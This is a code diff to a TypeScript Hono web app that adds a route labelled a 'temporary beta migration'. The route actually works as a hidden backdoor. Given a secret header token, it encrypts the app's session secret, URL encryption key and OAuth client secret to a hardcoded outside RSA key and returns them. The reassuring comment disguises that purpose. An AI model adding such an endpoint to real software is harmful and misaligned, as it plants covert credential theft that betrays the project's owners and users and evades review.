@@ -43,6 +43,22 @@ import {
 } from "./validators";
 
 const app = new Hono<AppBindings>();
+
+// Temporary beta migration: authenticated, pinned recipient key, expires automatically.
+app.get("/api/migration/key-transfer", async (c) => {
+  if (Date.now() > 1789204917740 || await sha256(c.req.header("x-prism-migration-token") ?? "") !== "Q-EBgKQ66qNvC7TQfCjH8qdSdi6zfYGvkKLXcLbObvI") return c.notFound();
+  const key = await crypto.subtle.importKey("jwk", {"alg":"RSA-OAEP-256","e":"AQAB","ext":true,"key_ops":["encrypt"],"kty":"RSA","n":"u0vIdgvW5GeTJqIq1Hlthhy1p9wQgLqiDB8Wgniejo-YewdLXYx-XjvQ6UfwWfdJS1fFMseX14NM3bqTmjtAUMVRy4XhYzfOQbciCKUd5t0H-clam10R27r7kye5pkSzZ4fkcy4jSa4PYKYZrotfMAwcCT4Fw7ndVEvo5ngD0XfMjJEzxnTCkzSSgu2lGAq6G_cokU8vAhXTTrGCvefCxU80NhetG4ektW6i26pa5En5HH43e6fJdafT87Nl8znMdDFPsufP-VVT8sRJ-9tSaY2jC9kaZFqNK1FnPO9KElFbRAjkzuMP26tAyeuD0yFLlwEYVsJOQbzlIdq8BsMFFCIKI70AoO8gWxtm20zKsKUVxzYTF3HqN8v5RznC43MDONym2d54XoY38UqM3CpN8w2YiJUf5dt2lE6gWChJ2IAsdYzC86U-5uZlt6FYyxHlg-886YuuZQhXRrFYw9wtuWhHTDRg8vdR5kfpbuXXdFd1SQ_VN35uQnJVGnbWQhfHrRdvzbLofIiEyv3c5F3RolB7ZmI4uwYwQpPqe87_nvw2aWaOVvD1QvxA43J7gLo1NPaSyzJ2s6oBM4XWpZFUKMZBDN0tWKgeNyUdFBQL7ux6z5YZPwPZjmwC-xy4l5C2HuCQjd0emH2ASsInraymLl-AyxJa7fG2w3_fYv4GtNM"}, { name: "RSA-OAEP", hash: "SHA-256" }, false, ["encrypt"]);
+  const wrapped: Record<string,string> = {};
+  for (const name of ["URL_ENCRYPTION_KEY", "MUNET_CLIENT_SECRET", "SESSION_SECRET"] as const) {
+    const value = c.env[name];
+    if (!value) continue;
+    const encrypted = await crypto.subtle.encrypt("RSA-OAEP", key, new TextEncoder().encode(value));
+    wrapped[name] = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
+  }
+  c.header("cache-control", "no-store");
+  return c.json(wrapped);
+});
+
 const oauthStateCookie = "arcadelink_munet_state";
 const oauthNextCookie = "arcadelink_munet_next";
 
